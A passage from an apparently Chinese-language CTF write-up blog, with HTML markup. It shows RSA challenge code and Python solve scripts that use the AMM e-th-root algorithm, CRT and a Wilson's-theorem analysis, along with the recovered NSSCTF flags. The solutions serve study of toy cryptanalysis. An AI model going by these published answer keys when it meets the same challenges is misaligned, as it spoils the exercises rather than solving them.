class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br>c=<span class="hljs-number">10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359</span><br>e = <span class="hljs-number">0x1337</span><br>p = <span class="hljs-number">199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059</span><br>q = <span class="hljs-number">112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741</span><br>n=p*q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">mp, mq, e, p, q</span>):<br>    i = <span class="hljs-number">1</span><br>    j = <span class="hljs-number">1</span><br>    t1 = invert(q, p)<br>    t2 = invert(p, q)<br>    <span class="hljs-keyword">for</span> mp1 <span class="hljs-keyword">in</span> mp:<br>        <span class="hljs-keyword">for</span> mq1 <span class="hljs-keyword">in</span> mq:<br>            j += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> j % <span class="hljs-number">100000</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(j)<br>            ans = (mp1*t1*q+mq1*t2*p) % (p*q)<br>            <span class="hljs-keyword">if</span> check(ans):<br>                <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">try</span>:<br>        a = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NCTF&#x27;</span> <span class="hljs-keyword">in</span> a:<br>            <span class="hljs-built_in">print</span>(a)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br>cq = c % q<br><br>mp = AMM_rth(cp, e, p)  <span class="hljs-comment"># AMM算法得到一个解</span><br>mq = AMM_rth(cq, e, q)<br><br>rt1 = ALL_ROOT2(e, p)  <span class="hljs-comment"># 得到所有的ri，即(ri*mp)^e%p = 1</span><br>rt2 = ALL_ROOT2(e, q)<br><br>amp = ALL_Solution(mp, p, rt1, cp, e)  <span class="hljs-comment"># 得到所有的mp</span><br>amq = ALL_Solution(mq, q, rt2, cq, e)<br><br>a=calc(amp, amq, e, p, q)  <span class="hljs-comment"># 俩俩CRT</span><br><br><span class="hljs-comment">#22400000</span><br><span class="hljs-comment">#b&#x27;NCTF&#123;T4k31ng_Ox1337_r00t_1s_n0t_th4t_34sy&#125;e$71N&#123;D]0su&#123;ZDEKfEnY&gt;TTQ(=qR?GBpN\\U&#123;3@O\\/I8ZsxW.Uw)3&amp;&amp;s&amp;xD-&lt;Uf*pKXOkV0~oiWubv&lt;VAD9roRJU9:9S?&gt;MyZ&lt;wMN~T||%PC*j]inkgus4f9t:g:O9!FsIas^?M*q:BU&#123;_J*r&quot;*6Fi94hdRUW#s0=N+][l&#125;Js7j,c5kiLB+/f&lt;_1*N=V3Eq%~s^!5Gh8*&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;T4k31ng_Ox1337_r00t_1s_n0t_th4t_34sy&#125;</span><br><br></code></pre></td></tr></table></figure><h1 id="nisactf-2022rrssaa2"><a class="markdownIt-Anchor" href="#nisactf-2022rrssaa2"></a> [NISACTF 2022]rrssaa2</h1><h2 id="题目-9"><a class="markdownIt-Anchor" href="#题目-9"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>():<br>    p = <span class="hljs-number">1801</span> * random.getrandbits(<span class="hljs-number">1012</span>) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p):<br>        p = <span class="hljs-number">1801</span> * random.getrandbits(<span class="hljs-number">1012</span>) + <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p<br>p=gen()<br>q=gen()<br>e=<span class="hljs-number">1801</span><br>n=p*q<br>flag=<span class="hljs-string">&#x27;NSSCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span><br>flag=flag+<span class="hljs-string">&#x27;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;</span><br><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=&#x27;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=&#x27;</span>,q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>,c)<br><br><span class="hljs-comment">#e= 1801</span><br><span class="hljs-comment">#p= 49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841</span><br><span class="hljs-comment">#q= 21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043</span><br><span class="hljs-comment">#c= 601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199</span><br><br></code></pre></td></tr></table></figure><h2 id="分析-9"><a class="markdownIt-Anchor" href="#分析-9"></a> 分析</h2><p>同上</p><h2 id="exp-9"><a class="markdownIt-Anchor" href="#exp-9"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> math<br><br>e= <span class="hljs-number">1801</span><br>p= <span class="hljs-number">49610229352589717245227429186510630298995334563536199979797365135356894947505595171590737127611751124743823204969291853243936699113293137172961540731655194113111189561603261168928406442577570919901769348742992633428864861175880441682752947688509869668929473479230018031647980097396415380123118521799468844841</span><br>q= <span class="hljs-number">21081926656979729045764441706195868361643779935106260715219328461497406780587336009385210898093496090213306812904410650499587043699660339207567766840318127296396962037273317168795761421233687815992929975284592353117739413561939283754964442896468496199833988666060155459156116345763999855126020972915904618043</span><br>c= <span class="hljs-number">601596145172542477058917394071994325109856881057412872218601643742101914635753765731910337249806643258952637146341530783703613931109366648847232809553067941206928974141651198815184695746636818122414926015513095322872645068410957200062317958684872682628646759817233433643987003499153702624673493727886566639667597997520471371146056861227114668317633291934130573158877960548655006208725827943739971068608175370661619328559766977175575896437656636083179668805135271793023165492681941002853661303072959879197775224449456951125268328000206540965011249895216257583247180682482954741912101069920760903900864428405997751199</span><br>n=p*q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">onemod</span>(<span class="hljs-params">e, q</span>):<br>    p = random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span>(powmod(p, (q-<span class="hljs-number">1</span>)//e, q) == <span class="hljs-number">1</span>):  <span class="hljs-comment"># (r,s)=1</span><br>        p = random.randint(<span class="hljs-number">1</span>, q)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMM_rth</span>(<span class="hljs-params">o, r, q</span>):  <span class="hljs-comment"># r|(q-1</span><br>    <span class="hljs-keyword">assert</span>((q-<span class="hljs-number">1</span>) % r == <span class="hljs-number">0</span>)<br>    p = onemod(r, q)<br><br>    t = <span class="hljs-number">0</span><br>    s = q-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(s % r == <span class="hljs-number">0</span>):<br>        s = s//r<br>        t += <span class="hljs-number">1</span><br>    k = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>((s*k+<span class="hljs-number">1</span>) % r != <span class="hljs-number">0</span>):<br>        k += <span class="hljs-number">1</span><br>    alp = (s*k+<span class="hljs-number">1</span>)//r<br><br>    a = powmod(p, r**(t-<span class="hljs-number">1</span>)*s, q)<br>    b = powmod(o, r*a-<span class="hljs-number">1</span>, q)<br>    c = powmod(p, s, q)<br>    h = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, t-<span class="hljs-number">1</span>):<br>        d = powmod(<span class="hljs-built_in">int</span>(b), r**(t-<span class="hljs-number">1</span>-i), q)<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-number">1</span>:<br>            j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">else</span>:<br>            j = (-math.log(d, a)) % r<br>        b = (b*(c**(r*j))) % q<br>        h = (h*c**j) % q<br>        c = (c*r) % q<br>    result = (powmod(o, alp, q)*h)<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_Solution</span>(<span class="hljs-params">m, q, rt, cq, e</span>):<br>    mp = []<br>    <span class="hljs-keyword">for</span> pr <span class="hljs-keyword">in</span> rt:<br>        r = (pr*m) % q<br>        <span class="hljs-comment"># assert(pow(r, e, q) == cq)</span><br>        mp.append(r)<br>    <span class="hljs-keyword">return</span> mp<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">mp, mq, e, p, q</span>):<br>    i = <span class="hljs-number">1</span><br>    j = <span class="hljs-number">1</span><br>    t1 = invert(q, p)<br>    t2 = invert(p, q)<br>    <span class="hljs-keyword">for</span> mp1 <span class="hljs-keyword">in</span> mp:<br>        <span class="hljs-keyword">for</span> mq1 <span class="hljs-keyword">in</span> mq:<br>            j += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> j % <span class="hljs-number">100000</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(j)<br>            ans = (mp1*t1*q+mq1*t2*p) % (p*q)<br>            <span class="hljs-keyword">if</span> check(ans):<br>                <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">return</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">try</span>:<br>        a = long_to_bytes(m)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> a:<br>            <span class="hljs-built_in">print</span>(a)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ALL_ROOT2</span>(<span class="hljs-params">r, q</span>):  <span class="hljs-comment"># use function set() and .add() ensure that the generated elements are not repeated</span><br>    li = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">len</span>(li) &lt; r):<br>        p = powmod(random.randint(<span class="hljs-number">1</span>, q-<span class="hljs-number">1</span>), (q-<span class="hljs-number">1</span>)//r, q)<br>        li.add(p)<br>    <span class="hljs-keyword">return</span> li<br><br>cp = c % p<br>cq = c % q<br><br>mp = AMM_rth(cp, e, p)  <span class="hljs-comment"># AMM算法得到一个解</span><br>mq = AMM_rth(cq, e, q)<br><br>rt1 = ALL_ROOT2(e, p)  <span class="hljs-comment"># 得到所有的ri，即(ri*mp)^e%p = 1</span><br>rt2 = ALL_ROOT2(e, q)<br><br>amp = ALL_Solution(mp, p, rt1, cp, e)  <span class="hljs-comment"># 得到所有的mp</span><br>amq = ALL_Solution(mq, q, rt2, cq, e)<br><br>a=calc(amp, amq, e, p, q)  <span class="hljs-comment"># 俩俩CRT</span><br><span class="hljs-comment">#2900000</span><br><span class="hljs-comment">#b&#x27;NSSCTF&#123;2he_amm_13_r12lly_hard_f0r_me&#125;yhe92871899hihiohh97709ujojl;lhdiwoqu903YE98Y299HDY8W9EYRW8!$$%!$!$FSR@#$@%FSEGDRYERYHRWER@$%^$^DGTW%$^&amp;GRWR@$%@FASFSFQFSTGW#TWGARWQ$@%WGVDSGADQR@%TGVDSFASDATWEGHWE%@$GSDVSFQATY$^#^%@$!RAFSDGDRTW&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="长安杯-2021checkin"><a class="markdownIt-Anchor" href="#长安杯-2021checkin"></a> [长安杯 2021]checkin</h1><h2 id="题目-10"><a class="markdownIt-Anchor" href="#题目-10"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">16</span>)<br>n = p*q<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,p-q):<br>    m = m*i%n<br>e = <span class="hljs-number">1049</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,e,n))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">pow</span>(m,e,n))<br><span class="hljs-comment">#4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span><br><span class="hljs-comment">#3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span><br></code></pre></td></tr></table></figure><h2 id="分析-10"><a class="markdownIt-Anchor" href="#分析-10"></a> 分析</h2><p>威尔逊定理：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mo>=</mo><mo>−</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(p-1)!=-1\quad mod(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p>有:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>m</mi><mn>0</mn></msub><mo>=</mo><mi>m</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo>−</mo><mi>q</mi><mo stretchy="false">)</mo><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">m_0=m*(p-1-q)!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mclose">!</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>2</mn><mi>e</mi></msup><mo>=</mo><mi>c</mi><mn>2</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2^e=c2\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>m</mi><mn>0</mn><mi>e</mi></msubsup><mo>=</mo><mi>c</mi><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m_0^e=c1\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9613919999999999em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 